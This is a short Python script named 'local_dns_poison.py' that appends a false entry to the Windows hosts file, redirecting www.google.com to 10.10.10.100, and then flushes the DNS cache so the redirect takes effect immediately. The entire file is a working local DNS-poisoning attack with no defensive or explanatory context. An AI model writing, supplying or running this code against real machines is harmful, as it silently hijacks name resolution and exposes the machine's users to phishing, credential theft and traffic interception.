#!/usr/bin/env python
# Filename: local_dns_poison.py
# This program is optimized for Python 3.4
# Description: Appends a false DNS record to the local host file and flushes DNS records
#   counterpart: None

import subprocess
import os

os.chdir("C:\Windows\System32\drivers\etc")
command = "echo 10.10.10.100 www.google.com >> hosts"
CMD = subprocess.Popen(command,
                       shell=True,
                       stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)

command = "ipconfig /flushdns"
CMD = subprocess.Popen(command,
                       shell=True,
                       stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
